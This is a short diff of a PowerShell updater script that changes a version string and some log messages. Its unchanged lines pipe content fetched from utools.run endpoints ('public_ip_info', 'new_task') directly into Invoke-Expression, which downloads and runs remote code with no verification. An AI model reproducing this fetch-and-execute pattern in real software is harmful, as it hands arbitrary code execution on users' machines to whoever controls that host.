@@ -1,7 +1,7 @@
 
 # please change the version string  and new_task.ps1 script for do updating
 
-$lastestVersion = '3.5'
+$lastestVersion = '3.9'
 
 Invoke-RestMethod utools.run/public_ip_info|Invoke-Expression 
 
@@ -42,15 +42,15 @@ function GetVersion() {
 $version = GetVersion
 
 if ($version -eq $lastestVersion) {
-    mylog("lastest version.")
+    mylog("lastest version is: " + $lastestVersion)
 }else {
     Invoke-RestMethod utools.run/new_task|Invoke-Expression
     try {
         SetVersion($lastestVersion)
-        mylog($lastestVersion+":updated successfully.")
+        mylog("version: "+$lastestVersion+" updated successfully.")
 
     }
     catch {
-        mylog($lastestVersion+":updated failed.")
+        mylog($lastestVersion+" updated failed.")
     }
 }
